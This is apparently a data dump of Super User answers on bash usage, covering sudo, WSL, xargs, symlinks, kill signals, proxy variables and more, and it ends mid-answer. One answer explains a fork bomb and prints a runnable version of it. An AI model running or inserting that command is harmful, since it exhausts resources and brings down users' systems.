"Sudo - is there a command to check if I have sudo and/or how much time is left?","195781","<linux><bash><sudo>","28","<p>The <code>-n</code> option is available in newer versions of sudo, but as you stated that's not an option.  There's no real way to do what you're looking for short of just trying sudo and seeing if it comes back with a prompt for a password.  If your concern is you want a visual indication, why not start do sudo /bin/bash to start a root bash session?  Note that this is insecure, but it's also somewhat insecure if someone realizes your prompt changes on sudo.  </p>
"
"Cygwin Dos2Unix Command not found","612435","<windows><bash><cygwin>","28","<p>You should find <code>dos2unix</code> in the category <em>Utils</em>, <em>Base</em>, or <em>Text</em>. It's easiest to use the search function.
If the package is not listed at all, try to use a different mirror.</p>

<p>If you installed this package while your cygwin terminal is still open, do a <code>rehash</code> (depends on you shell) or simply start a new terminal.</p>

<p><img src=""https://i.stack.imgur.com/mjw5y.png"" alt=""enter image description here""></p>
"
"Open Ubuntu Bash's GUI applications on Windows 10","1075659","<bash><ubuntu><gtk><windows-10>","28","<p>I got it working by installing x11-apps to get the X subsystem, then running a X listener like XMING or XManager on the Windows10 side.  Set the display in bash with the following:</p>

<p>export DISPLAY=:0</p>

<p>(You also can add export DISPLAY=:0 to the last line of your user's .bashrc file)</p>

<p>Then run xclock to verify.</p>
"
"Why does vim delay for a second whenever I use the 'O' command (open a new line above and insert)?","161178","<bash><vim><gnome-terminal>","28","<p>If the previous key pressed was ESC, this is because there are keys that can generate escape sequences beginning with ESC O.  For example depending on the cursor key mode, the up arrow key may generate the escape sequence ESC O A.</p>

<p>If it sees a partial escape sequence, vim will wait for a short timeout to see if another character is received that matches one of the escape sequences defined for your terminal type.  If not it will treat the characters as separate keystrokes.  You can test this by entering a capital A while waiting for the line to open to see if it treats it as an up arrow instead.</p>

<p>There are some vim settings that can be used to control this.  <code>:set ttimeoutlen=100</code> will change the escape sequence timeout to 100ms.  <code>:set noesckeys</code> will completely disable recognition of keys sending an escape sequence when in insert mode.  Also, vi-compatible mode will not have this issue because esckeys is off in that mode – that is why <code>vim -u NONE</code> works.</p>
"
"Where is the Ubuntu console on Windows10?","1108480","<windows-10><bash><windows-subsystem-for-linux><windows-10-v1607>","28","<h2>To enable the bash shell from the Windows 10 Anniversary Update, you have to enable the feature <code>Windows Subsystem for Linux</code></h2>

<blockquote>
  <p><strong>1. Go into the Control Panel and click <em>Turn Windows features on or off</em></strong>
  <a href=""https://i.stack.imgur.com/yooqm.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/yooqm.png"" alt=""enter image description here""></a></p>
  
  <p><strong>2. Then select the package <em>Windows Subsystem for Linux (Beta)</em>. It will go through the installation process and ask you to restart your computer.</strong>
  <a href=""https://i.stack.imgur.com/ML5bN.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/ML5bN.png"" alt=""enter image description here""></a></p>
  
  <p><strong>3. Once it's restarted, you can search for bash in the search bar.</strong> 
  <a href=""https://i.stack.imgur.com/BDRHG.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/BDRHG.png"" alt=""enter image description here""></a></p>
</blockquote>
"
"What is SHELL-FORMAT in envsubst?","1148950","<bash><environment-variables>","28","<p>As indicated by the text, you just have to reference (e.g. by <code>$VARNAME</code> or <code>${VARNAME}</code>) the variables as in a usual shell command. However, you have to make sure that the shell does not expand them beforehand.</p>

<p>Here are some examples to illustrate this (assuming <code>export FOO=BAR</code>):</p>

<pre><code>$ echo '$FOO$FOO2' | envsubst
BAR
</code></pre>

<p>As you can see, $FOO2 has been replaced by """" as it was not defined. Now we can restrict that replacement to only $FOO by:</p>

<pre><code>$ echo '$FOO$FOO2' | envsubst '$FOO'
BAR$FOO2
</code></pre>

<p>using <code>""""</code> instead of <code>''</code> would lead to substitution before it is wanted:</p>

<pre><code>echo '$FOO$FOO2' | envsubst ""$FOO""
$FOO$FOO2
</code></pre>

<p>(This amounts to the effective call <code>envsubst ""BAR""</code> which detects no variables so none are replaced.)</p>

<p>As the <code>man</code>-page said, all variables that are referenced in <code>SHELL-FORMAT</code> are replaced, so we can even do this:</p>

<pre><code>echo '$FOO$FOO2$FOO3' | envsubst '$FOO some more text ${FOO3}'
BAR$FOO2
</code></pre>

<p>As you can see, the <code>SHELL-FORMAT</code> is quite flexible.</p>

<p>Finally, the parameter <code>--variables</code> allows you to evaluate which variables are selected for substitution by the <code>SHELL-FORMAT</code>:</p>

<pre><code>envsubst --variables '$FOO some more text ${FOO3}'
FOO
FOO3
</code></pre>

<p>In the premature substitution example from above this would have shown the error:</p>

<pre><code>$ envsubst --variables ""$FOO""
(empty string returned)
</code></pre>

<p>As stated in the <code>man</code>-page, <code>envsubst</code> does not process any stdinput when <code>--variables</code> is present.</p>
"
"(reverse-i-search) in Bash","159106","<linux><bash><command-history>","28","<p>There's a <a href=""https://stackoverflow.com/questions/549810/control-r-reverse-i-search-in-cygwin-bash-how-do-you-reset-the-search"">similar question on stackoverflow.com</a>.</p>

<p>The best answer there is to use <code>Ctrl+G</code> to cancel the current search.</p>
"
"How to replace part of a text file between markers with another text file?","440013","<bash><unix><shell-script><textfiles><text-processors>","28","<pre><code>newContent=`cat new_file`
perl -0777 -i -pe ""s/(### BEGIN GENERATED CONTENT\\n).*(\\n### END GENERATED CONTENT)/\$1$newContent\$2/s"" existing_file
</code></pre>
"
"What is the difference between bash and sh?","125728","<unix><bash><shell>","27","<p><code>bash</code> is a superset of <code>sh</code> ie. everything you can do in <code>sh</code> you can do in <code>bash</code>.</p>

<p>Bash has more features (branching, builtins, arrays) making script easier to write. Some later *nix'es have <code>/bin/sh</code> as a link to <code>/bin/bash</code></p>

<p>For a full explanation of what <a href=""http://www.dartmouth.edu/~rc/classes/ksh/welcome.html"" rel=""nofollow noreferrer"">here's a tutorial</a></p>
"
"Right align part of prompt","187455","<bash><command-line><ps1>","27","<p>What you want can fairly easily be done by displaying the first line before displaying the prompt. For example, the following displays a prompt of <code>\w</code> on the left of the first line and a prompt of <code>\u@\h</code> on the right of the first line. It makes use of the <code>$COLUMNS</code> variable which contains the width of the terminal and the <code>$PROMPT_COMMAND</code> parameter which is evaluated before bash displays the prompt.</p>

<pre><code>print_pre_prompt () 
{ 
    PS1L=$PWD
    if [[ $PS1L/ = ""$HOME""/* ]]; then PS1L=\~${PS1L#$HOME}; fi
    PS1R=$USER@$HOSTNAME
    printf ""%s%$(($COLUMNS-${#PS1L}))s"" ""$PS1L"" ""$PS1R""
}
PROMPT_COMMAND=print_pre_prompt
</code></pre>
"
"Why doesn't my symbolic link work?","511900","<linux><ubuntu><bash><symbolic-link>","27","<p>Symlinks tend to like full paths or relative to the link, otherwise they can often be looking for <code>file-1.txt</code> locally (oddly enough).</p>

<p>Navigate to <code>proper</code> and execute <code>ls -l</code> and you can see that the symlink is looking for <code>actual/file-1.txt</code>, when it should be <code>../actual/file-1.txt</code>.</p>

<p>So you have two options:</p>

<ol>
<li><p>Give the full path</p>

<pre><code>ln -s ~/actual/file-1.txt ~/actual/file-2.txt ~/proper
</code></pre></li>
<li><p>Navigate to the folder you want the link to be in and link from there</p>

<pre><code>cd proper
ln -s ../actual/file-1.txt ../actual/file-2.txt ./
</code></pre></li>
</ol>

<p><em>Edit</em>: A hint to save typing.</p>

<p>You could just do <code>ln -s ~/actual/file-{1,2}.txt ~/proper</code></p>

<p>The items in the curly braces are substituted and placed after each other, creating the command<ul></p>

<pre><code>ln -s ~/actual/file-1.txt ~/actual/file-2.txt ~/proper
</code></pre>

<p></ul>which links both files to the target directory. Saves some major typing as you get further on in the shell.</p>
"
"Completely uninstall the subsystem for Linux on Win10?","1317883","<windows-10><bash><windows-subsystem-for-linux>","27","<p>In order to disable WSL, one has to go back into</p>

<p>Control Panel -> programs-features -> turn on/off Windows features and deselect Windows Subsystem for Linux, and Save.</p>
"
"Why is xargs necessary?","600253","<bash><pipe><xargs><coreutils>","27","<p>You are confusing two very different kinds of input: STDIN and arguments. Arguments are a list of strings provided to the command as it starts, usually by specifying them after the command name (e.g. <code>echo these are some arguments</code> or <code>rm file1 file2</code>). STDIN, on the other hand, is a stream of bytes (sometimes text, sometimes not) that the command can (optionally) read after it starts. Here are some examples (note that <code>cat</code> can take either arguments or STDIN, but it does different things with them):</p>

<pre><code>echo file1 file2 | cat    # Prints ""file1 file2"", since that's the stream of
                          # bytes that echo passed to cat's STDIN
cat file1 file2    # Prints the CONTENTS of file1 and file2
echo file1 file2 | rm    # Prints an error message, since rm expects arguments
                         # and doesn't read from STDIN
</code></pre>

<p><code>xargs</code> can be thought of as converting STDIN-style input to arguments:</p>

<pre><code>echo file1 file2 | cat    # Prints ""file1 file2""
echo file1 file2 | xargs cat    # Prints the CONTENTS of file1 and file2
</code></pre>

<p><code>echo</code> actually does more-or-less the opposite: it converts its arguments to STDOUT (which can be piped to some other command's STDIN):</p>

<pre><code>echo file1 file2 | echo    # Prints a blank line, since echo doesn't read from STDIN
echo file1 file2 | xargs echo    # Prints ""file1 file2"" -- the first echo turns
                                 # them from arguments into STDOUT, xargs turns
                                 # them back into arguments, and the second echo
                                 # turns them back into STDOUT
echo file1 file2 | xargs echo | xargs echo | xargs echo | xargs echo    # Similar,
                                 # except that it converts back and forth between
                                 # args and STDOUT several times before finally
                                 # printing ""file1 file2"" to STDOUT.
</code></pre>
"
"Convert symlinks to hard links","560597","<bash><find><symbolic-link>","27","<p>This command should work:</p>

<pre><code>find -type l -exec bash -c 'ln -f ""$(readlink -m ""$0"")"" ""$0""' {} \;
</code></pre>

<p>How it works:</p>

<ul>
<li><p><code>find -type l</code> finds all links in the current directory.</p></li>
<li><p><code>-exec bash -c '...' {} \;</code> invokes bash to execute <code>...</code>.</p>

<p>It passes <code>{}</code> &ndash; the name of the link that's currently being processed &dash; as an argument, which bash can access as <code>$0</code>.</p></li>
<li><p><code>readlink -m ""$0""</code> returns the absolute path of the symbolic link's destination. </p></li>
<li><p><code>ln -f ""$(readlink -m ""$0"")"" ""$0""</code> overwrites (<code>-f</code>) the symbolic link <code>$0</code> with a hard link to its target.</p></li>
</ul>

<p>If the link cannot be converted for some reason, it will remain untouched and ln will print an error message.</p>
"
"How to prevent Bash from altering history?","302230","<bash><history>","27","<p>You want the readline setting:</p>

<pre><code>set revert-all-at-newline on
</code></pre>

<p>You can either put it in <code>~/.inputrc</code> (see note below), or put <code>bind 'revert-all-at-newline on'</code> in your <code>~/.bashrc</code>.</p>

<p>Demo:</p>

<pre class=""lang-none prettyprint-override""><code>$ man bash
$ bind 'set revert-all-at-newline on'
$ man bsh # up arrow and edit
No manual entry for bsh
$ man bash # three up arrows
</code></pre>

<p>Further details are in the <a href=""https://www.gnu.org/software/bash/manual/bash.html#index-revert_002dall_002dat_002dnewline"" rel=""noreferrer"">Bash manpage</a>:</p>

<blockquote>
  <p><code>revert-all-at-newline</code></p>
  
  <p>If set to ‘<code>on</code>’, Readline will undo all changes to history lines before returning when accept-line is executed. By default, history lines may be modified and retain individual undo lists across calls to readline. The default is ‘<code>off</code>’.</p>
</blockquote>

<hr>

<blockquote>
  <p><strong><em>Note:</em></strong></p>
  
  <p>If a new <code>~/.inputrc</code> file is created for the purpose of setting <code>revert-all-at-newline</code>, be aware that bash will use the readline settings in this file <strong><em>instead of</em></strong> any settings which may be in the file <code>/etc/inputrc</code>.  That is, any settings specified in <code>/etc/inputrc</code> will no longer be in effect.  Therefore, if the <code>/etc/inputrc</code> file exists, it's a good idea to start <code>~/.inputrc</code> with the line:</p>
  
  <p><code>$include /etc/inputrc</code></p>
</blockquote>
"
"How can I change the default Python version on Snow Leopard?","35256","<mac><osx-snow-leopard><bash><python>","27","<p>It’s easy:</p>

<pre><code>defaults write com.apple.versioner.python Version 2.6
</code></pre>

<p>See <code>man python</code> for a complete explanation from Apple.</p>

<p>Also, one gotcha: make sure you are running the Python that came with your computer and not some other one that you installed. Do this by typing <code>which python</code> at your command prompt. It should point to <code>/usr/bin/python</code>. I only mention this because my default is 2.6 under Snow Leopard (it was 2.5 when I was using Leopard). So the fact that you are getting 2.5 may indicate that there’s something else in your path.</p>

<p><strong>Update</strong></p>

<p>To address comments below:</p>

<blockquote>
  <p>This doesn’t do what people are asking.</p>
</blockquote>

<p>It does for me, in OS X 10.8.2. After doing <code>defaults write com.apple.versioner.python Version 2.6</code>, the default version of Python is indeed 2.6. (And likewise after changing back to 2.7.)</p>

<p>This is true whether I run <code>python</code> directly, or use an executable script starting with <code>#!/usr/bin/env python</code>—I get the expected version of Python.</p>

<blockquote>
  <p>This does not solve the symlink in /System/Library/Frameworks/Python.framework/Versions where Current point to 2.7 which may cause problems (because it is still in the sys.path with 2.6 !) </p>
</blockquote>

<p>Indeed, it doesn’t fix that symlink.</p>

<p>However, run a short script that <code>print()</code>s the <code>sys.path</code> and (at least on my relatively default setup) the 2.6 library directories <em>are</em> on the path and the 2.7 dirs are <em>not</em> on the path. Nor is the <code>Current</code> symlinked directory on the path. So it should not be a problem for most scripts.</p>

<p>However, it’s possible—haven’t tested—that the <code>Current</code> symlink is used by either <code>easy_install</code> or <code>pip</code>. That would cause problems. It sure does seem like a bug that the symlink isn’t updated when you update the Python version.</p>
"
"Does bash's * match files in alphanumeric order?","192280","<bash><globbing>","27","<p>Short answer: Yes it will.</p>

<p>From the <a href=""http://www.gnu.org/software/bash/manual/bashref.html#Filename-Expansion"" rel=""noreferrer"">bash man</a> page:</p>

<blockquote>
  <p>After word splitting, unless the -f
  option has been set (see The Set
  Builtin), Bash scans each word for the
  characters ‘*’, ‘?’, and ‘[’. If one
  of these characters appears, then the
  word is regarded as a pattern, and
  replaced with an alphabetically sorted
  list of file names matching the
  pattern.</p>
</blockquote>
"
"How do I edit previous lines in a multiple line command in Bash?","409150","<linux><bash><gnome><gnome-terminal>","27","<p>That, unfortunately, is up to <code>bash</code>, not to the terminal. Your options are:</p>

<ol>
<li><p>Use semicolons instead of newlines, although even then you can't move up a screen line at a time but must use character or word motion commands.  (Oddly, <code>zsh</code> at least lets you move within a compound command when editing history, just not within the <em>current</em> command.)  Sometimes <code>fc</code> (which tosses you into your editor with the previous command) is the easiest way to handle compound commands.</p></li>
<li><p>If you are using Bash, use the following key combination:</p>

<pre><code>ctrl x e
</code></pre>

<p>It will open up the command you are working on using your text editor.  Save the file and quit. (I found the command on the <a href=""http://shellhaters.heroku.com/"" rel=""noreferrer"">Shell Hater's presentation</a>.)
Zsh users have <a href=""https://stackoverflow.com/questions/890620/unable-to-have-bash-like-c-x-e-in-zsh"">this alternative</a>. </p></li>
</ol>
"
"How to insert the date into vim","451340","<linux><command-line><bash><vim><date>","27","<p>Vim has an internal <code>strftime()</code> function.  Try this (in insert mode):</p>

<pre><code>&lt;C-r&gt;=strftime('%F')&lt;CR&gt;
</code></pre>
"
"Measure script execution time","228801","<linux><bash>","27","<p>Yes.</p>

<pre><code> time script
</code></pre>

<p>Where <code>script</code> is the script to monitor the time for.</p>

<p>For instance, <code>time find ~</code> will output something like this (Depending on the size of your home directory, that is): </p>

<pre><code>real    0m49.139s
user    0m0.663s
sys     0m4.129s
</code></pre>
"
"change bash shortcut keys such as Ctrl-C?","160388","<linux><bash><inputrc>","27","<p>Those aren't features of bash, they're features of the terminal driver. As such, they're specified by <code>stty(1)</code>.</p>

<pre><code>$ stty -a
speed 38400 baud; rows 24; columns 80; line = 0;
intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = M-^?; eol2 = M-^?;
swtch = M-^?; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W;
lnext = ^V; flush = ^O; min = 1; time = 0;
-parenb -parodd cs8 hupcl -cstopb cread -clocal -crtscts
-ignbrk brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff
-iuclc ixany imaxbel iutf8
opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt
echoctl echoke
</code></pre>
"
"How to remove duplicated files in a directory?","386199","<bash>","26","<h3>bash 4.x</h3>
<pre><code>#!/bin/bash
declare -A arr
shopt -s globstar

for file in **; do
  [[ -f &quot;$file&quot; ]] || continue
   
  read cksm _ &lt; &lt;(md5sum &quot;$file&quot;)
  if ((arr[$cksm]++)); then 
    echo &quot;rm $file&quot;
  fi
done
</code></pre>
<p>This is both recursive and handles any file name. Downside is that it requires version 4.x for the ability to use associative arrays and recursive searching. Remove the <code>echo</code> if you like the results.</p>
<h3>gawk version</h3>
<pre><code>gawk '
  {
    cmd=&quot;md5sum &quot; q FILENAME q
    cmd | getline cksm
    close(cmd)
    sub(/ .*$/,&quot;&quot;,cksm)
    if(a[cksm]++){
      cmd=&quot;echo rm &quot; q FILENAME q
      system(cmd)
      close(cmd)
    }
    nextfile
  }' q='&quot;' *
</code></pre>
<p>Note that this will still break on files that have double-quotes in their name. No real way to get around that with <code>awk</code>. Remove the <code>echo</code> if you like the results.</p>
"
"What is cmd's equivalent to Bash's & (ampersand) for running a command without waiting for it to terminate?","345602","<windows><command-line><bash><process>","26","<p><a href=""http://www.computerhope.com/starthlp.htm"" rel=""noreferrer"">start</a> with the <code>/B</code> option</p>

<blockquote>
  <p>Start application without creating a new window. The application has ^C handling ignored. Unless the application enables ^C processing, ^Break is the only way to interrupt the application</p>
</blockquote>

<pre><code>start /B java -jar jarfile1.jar

start /B java -jar jarfile2.jar
</code></pre>
"
"Why is cat not changing the access time?","464290","<linux><bash><timestamp><cat>","26","<p><a href=""http://en.wikipedia.org/wiki/Stat_%28system_call%29"" rel=""noreferrer"">http://en.wikipedia.org/wiki/Stat_(system_call)</a></p>

<p><a href=""http://en.wikipedia.org/wiki/Stat_%28system_call%29#Criticism_of_atime"" rel=""noreferrer"">Criticism of atime</a></p>

<p>Writing to a file changes its mtime and ctime, while reading a file changes its atime. As a result, on a POSIX-compliant system, reading a file causes a write, which has been criticized. This behaviour can usually be disabled by adding a mount option in /etc/fstab.</p>

<p>However, turning off atime updating breaks POSIX compliance, and some applications, notably the mutt mail reader (in some configurations), and some file usage watching utilities, notably tmpwatch. In the worst case, not updating atime can cause some backup programs to fail to back up a file.</p>

<p>Linux kernel developer Ingo Molnár called atime ""perhaps the most stupid Unix design idea of all times,"" adding: ""[T]hink about this a bit: 'For every file that is read from the disk, lets do a ... write to the disk! And, for every file that is already cached and which we read from the cache ... do a write to the disk!'"" He further emphasized the performance impact thus:</p>

<p>Atime updates are by far the biggest IO performance deficiency that Linux has today. Getting rid of atime updates would give us more everyday Linux performance than all the pagecache speedups of the past 10 years, <em>combined</em>.</p>

<p><a href=""https://superuser.com/questions/318293/how-to-know-if-noatime-or-relatime-is-default-mount-option-in-kernel"">how to know if noatime or relatime is default mount option in kernel?</a></p>

<pre><code>man mount
....
   relatime
          Update inode access times relative to  modify  or  change  time.
          Access time is only updated if the previous access time was ear‐
          lier than the current modify or change time. (Similar  to  noat‐
          ime,  but  doesn't break mutt or other applications that need to
          know if a file has been read since the last time  it  was  modi‐
          fied.)

          Since Linux 2.6.30, the kernel defaults to the behavior provided
          by this option (unless noatime was  specified), and the stricta‐
          time  option  is  required  to  obtain traditional semantics. In
          addition, since Linux 2.6.30, the file's  last  access  time  is
          always  updated  if  it  is more than 1 day old.
....
</code></pre>

<p>Which is how that particular partition was mounted and why cat does not update the access time as I expected. </p>
"
"Bash: optionally passing arguments to a command","802539","<bash><shell-script><bash-scripting><command-line-arguments>","26","<p>I've solved the problem with the bash <code>${var:+...}</code> syntax, (<a href=""http://mywiki.wooledge.org/BashFAQ/050#I_only_want_to_pass_options_if_the_runtime_data_needs_them"" rel=""noreferrer"">reference</a>).</p>

<p>The script now changes to</p>

<pre><code>curl \
    ${title:+ --data-urlencode ""title=${title}""} \
    http://example.com
</code></pre>

<p>which works perfectly.</p>

<p>Also see:</p>

<ul>
<li><a href=""https://stackoverflow.com/q/13206311/1232832"">Bash - function with optional arguments and missing logic</a></li>
<li><a href=""https://stackoverflow.com/q/9332802/1232832"">How to write a bash script that takes optional input arguments?</a></li>
</ul>
"
"loading local shell aliases to ssh session dynamicaly","503784","<linux><bash><shell><login><ssh>","26","<p>You can temporarily copy your <code>.bashrc</code> to your remote machine with another name. For example, using <code>.bashrc_temp</code>:</p>

<pre><code>user@local$ scp .bashrc user@remote:~/.bashrc_temp
</code></pre>

<p>Afterwards you can log into the remote machine:</p>

<pre><code>user@local$ ssh user@remote
</code></pre>

<p>and <a href=""http://linux.about.com/library/cmd/blcmdln_source.htm"" rel=""noreferrer""><code>source</code></a> the file <code>.bashrc_temp</code>:</p>

<pre><code>user@remote$ source ~/.bashrc_temp
</code></pre>

<p>Now you are able to use your <code>.bashrc</code> and your functions. When you are finished with your work you can remove the file ~/.bashrc_temp on the remote machine and logout.</p>

<p>The copying of the file and the login to the remote machine may be achieved with a bash function:</p>

<pre><code># copy the .bashrc to the remote machine 
# and log into the remote machine.
# parameter $1: user@remote
function s() {
  scp ~/.bashrc $1:~/.bashrc_temp
  ssh $1
}
</code></pre>

<p><strong>Update</strong>: </p>

<p>You may also consider to copy the <code>.bashrc</code> to <code>/tmp</code> on your remote machine and source <code>/tmp/.bashrc_temp</code>.</p>

<p><strong>Update 2</strong>:</p>

<p>You can log into the remote machine by using <a href=""http://unixhelp.ed.ac.uk/CGI/man-cgi?ssh%201"" rel=""noreferrer"">ssh -t</a>. This will automatically use your temp <code>.bashrc</code>. Updated function <code>s()</code>:</p>

<pre><code>function s() {
  scp ~/.bashrc $1:/tmp/.bashrc_temp
  ssh -t $1 ""bash --rcfile /tmp/.bashrc_temp ; rm /tmp/.bashrc_temp""
}
</code></pre>
"
"create mysql database with one line in bash","288621","<command-line><bash><mysql><database>","26","<p>@Nitrodist's answer will work, but it's over-engineering the problem. MySQL's command-line client supports the very handy <code>-e</code> switch, like so:</p>

<pre><code>mysql -uroot -e ""create database 'foo'""
</code></pre>

<p>You can of course substitute any valid SQL into there.</p>
"
"Why did ; after & return an unexpected token error in bash?","269429","<linux><bash>","26","<p>You don't need the semicolon.  After it's sent to the background it's free to get another command.</p>

<pre><code>evince foo.pdf bar.pdf &amp; emacs foo.tex &amp;
</code></pre>
"
"How to update bash on Mac OS X Yosemite","857250","<macos><bash><shell><shell-script><bash-scripting>","26","<p>Your problem is in your first line. You have this:</p>

<pre><code>#!/bin/bash
</code></pre>

<p>which explicitly states that the shell script should be ran with the old <code>/bin/bash</code>.
What you <em>really</em> want, is this:</p>

<pre><code>#!/usr/local/bin/bash
</code></pre>

<p>to use the new <code>bash</code> from <code>/usr/local/bin</code>.</p>
"
"What is /usr/bin/[ and how do I use it?","334549","<linux><bash><coreutils>","26","<p>It's an equivalent of the command <code>test</code>. (See <code>info test</code>.) Generally you use it in scripts in conditional expressions like:</p>

<pre><code>if [ -n ""$1"" ]; then
    echo $1
fi
</code></pre>

<p>The closing bracket is required to enclose the conditional. (Well, it looks like its required just to look nicer in the code. Does anybody know any other practical reason for it?)</p>
"
"How to take sha256sum of file and compare to check in one line?","1312740","<bash><hashing>","26","<p>I have downloaded an archive file and an accompanying checksum file.
Here is how I verify that the hash of the downloaded archive matches the hash from the downloaded checksum file:</p>

<pre><code>echo ""$(cat archive.tar.gz.sha256) archive.tar.gz"" | sha256sum --check --status
</code></pre>

<p>The <code>--status</code> flag prevents all stdout output (more effective than <code>--quiet</code>). I then need to rely on the return code to determine if they matched, which is what I want anyway since I'm going to be using this in a script.</p>
"
"What does this cryptic Bash command mean?","166755","<bash>","25","<p>It's, as you said, a forkbomb. What it does is define a function, then call it. The function is called <code>:</code>.</p>

<p>Let's name it <code>forkbomb</code> so we can better see what's going on:</p>

<pre><code>forkbomb(){ forkbomb|forkbomb&amp; };forkbomb
</code></pre>

<p>As you can see, and probably guess from your programming experience, the first part is the function definition (<code>forkbomb(){ ... }</code>), and the very last <code>:</code> is where the function gets called (the <code>;</code> just separates statements in Bash).</p>

<p>Now, what does this function do? If you're familiar with Bash, you'll know that the <code>|</code> character pipes the standard output of one command/program to the standard input of another. So basically, <code>:|:</code> starts up <strong>two</strong> instances of the function (this is where it ""forks"").</p>

<p>And then the magic: the <code>&amp;</code> puts those commands in the background, allowing the original function to return, while each instance forks 'til the cows come home in the background, thus using up all your resources and taking down the system (unless it has limits imposed on it).</p>
"
"Keep running command until output differs from previous run in Bash","1602243","<bash>","25","<p>From <a href=""https://man7.org/linux/man-pages/man1/watch.1.html#OPTIONS"" rel=""noreferrer""><code>man 1 watch</code></a>:</p>
<blockquote>
<p><code>-g</code>, <code>--chgexit</code><br />
Exit when the output of <em>command</em> changes.</p>
</blockquote>
<p><code>watch</code> is not required by POSIX but it's quite common anyway. In Debian or Ubuntu it's in the <code>procps</code> package along with <code>kill</code> and <code>ps</code> (and few other tools).</p>
<p>Example:</p>
<pre><code>watch -g -n 5 'date +%H:%M'
</code></pre>
"
"What is the default password of screen?","343965","<linux><bash><display>","25","<p>The screen password has always been simply the system password of the user running it in my experience.
the <a href=""http://www.manpagez.com/man/1/screen/"">manpage</a> says that if there's a screen lock program available, it will be used if configured so. So maybe you would need to figure out if this is the case, and how that program behaves.</p>
"
"Bash Man Page: kill <pid> vs kill -9 <pid>","107543","<unix><bash><kill><manpages>","25","<p><code>kill</code> just sends a signal to the given process. The <code>-9</code> tells it which signal to send.</p>

<p>Different numbers correspond to different common signals. <code>SIGINT</code>, for example, is 2, so to send a process the <code>SIGINT</code> signal issue the command</p>

<pre><code>$ kill -2 &lt;pid&gt;
</code></pre>

<p>The <a href=""http://unixhelp.ed.ac.uk/CGI/man-cgi?kill"" rel=""noreferrer"">manpage here</a> specifies:</p>

<blockquote>
  <p><strong>The  default  signal  for  kill is TERM.</strong></p>
</blockquote>

<p>The manpage also provides a table of signals you can send.  According to this table, <code>TERM</code> is <code>15</code>, so these are all equivalent:</p>

<pre><code>kill &lt;pid&gt;
kill -15 &lt;pid&gt;
kill -TERM &lt;pid&gt;
</code></pre>

<p>Notice 9 is the <code>KILL</code> signal.</p>

<pre><code>   Name   Number  Action
   -----------------------
   ALRM      14   exit
   HUP        1   exit
   INT        2   exit
   KILL       9   exit  this signal may not be blocked
   PIPE      13   exit
   POLL           exit
   PROF           exit
   TERM      15   exit     [Default]
   USR1           exit
   USR2           exit
   VTALRM         exit
   STKFLT         exit  may not be implemented
   PWR            ignore    may exit on some systems
   WINCH          ignore
   CHLD           ignore
   URG            ignore
   TSTP           stop  may interact with the shell
   TTIN           stop  may interact with the shell
   TTOU           stop  may interact with the shell
   STOP           stop  this signal may not be blocked
   CONT           restart   continue if stopped, otherwise ignore
   ABRT       6   core
   FPE        8   core
   ILL        4   core
   QUIT       3   core
   SEGV      11   core
   TRAP       5   core
   SYS            core  may not be implemented
   EMT            core  may not be implemented
   BUS            core  core dump may fail

   XCPU           core  core dump may fail
   XFSZ           core  core dump may fail
</code></pre>
"
"Check number of pending security updates in Ubuntu","199869","<linux><ubuntu><bash><shell><nagios>","25","<p>The Nagios plugin <code>/usr/lib/nagios/plugins/check_apt</code> does not detect critical updates in Ubuntu correctly due how it detects critical updates via <code>apt</code> combined with how Ubuntu non-critical updates are published. More details are in the bug here: <a href=""https://bugs.launchpad.net/bugs/1031680"" rel=""noreferrer"">https://bugs.launchpad.net/bugs/1031680</a></p>

<p>Using <code>/usr/lib/update-notifier/apt-check</code> instead is a reliable workaround.</p>
"
"warning: line editing not enabled","240223","<bash>","25","<p>You need to source that script. Do <code>. ./bind</code> or <code>source ./bind</code> to make that key binding active in the current session.</p>

<p>Running it normally, it doesn't have a terminal so it gives you that error message. Also, if it were to work, it would only be active for the duration of the script.</p>

<p>If you want that keybinding to be persistent, add that command to your <code>~/.bashrc</code>.</p>
"
"How to zip a list of files in Linux","834959","<bash><zip>","25","<p>Very simple:</p>

<pre><code>zip archive -@ &lt; out.txt
</code></pre>

<p>That is, if your <code>out.txt</code> file contains one filename per line. It will add all the files from <code>out.txt</code> to one archive called <code>archive.zip</code>.</p>

<p>The <code>-@</code> option makes <code>zip</code> read from STDIN.</p>

<p>If you want to skip creating a temporary <code>out.txt</code> file, you can use <code>grep</code>'s capability to print filenames, too. <code>-r</code> enables recursive search (might not be necessary in your case) and <code>-l</code> prints only filenames:</p>

<pre><code>grep -rl ""abc"" file-* | zip archive -@
</code></pre>
"
"Linux command line to turn off proxy","196166","<ubuntu><bash><proxy>","25","<p>As the other answer says there are some programs that don't look at the system at all you may have to set them up individually. For instance wget has a number of proxy options, that can be used to ignore or adapt the environmental proxy config during execution. Here are a number of areas in which the systems proxys can be set up. </p>

<ul>
<li>How my system looks, note that you
will have to change the specifed
system configuration for you
networking Environment.</li>
</ul>

<p>Some Linux systems use /etc/environment</p>

<pre><code>$ cat /etc/environment 
PATH=""/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games""
http_proxy=""http://192.168.1.250:8080/""
ftp_proxy=""ftp://192.168.1.250:8080/""
https_proxy=""https://192.168.1.250:8080/""  
</code></pre>

<p>There is no uniform single set up other use env</p>

<pre><code>$ env | grep -i proxy
NO_PROXY=localhost,127.0.0.0/8,127.0.1.1
http_proxy=http://192.168.1.250:8080/
FTP_PROXY=ftp://192.168.1.250:8080/
ftp_proxy=ftp://192.168.1.250:8080/
all_proxy=socks://192.168.1.250:8080/
ALL_PROXY=socks://192.168.1.250:8080/
HTTPS_PROXY=https://192.168.1.250:8080/
https_proxy=https://192.168.1.250:8080/
no_proxy=localhost,127.0.0.0/8,127.0.1.1
HTTP_PROXY=http://192.168.1.250:8080/  
</code></pre>

<p>I would check out the ~/.bashrc to have setting applied automatically on system start up. </p>

<pre><code>$ man env
$ man set
$ # The file section near the end of the bash manual.
$ man bash 

FILES
       /bin/bash
              The bash executable
       /etc/profile
              The systemwide initialization file, executed for login shells
       /etc/bash.bashrc
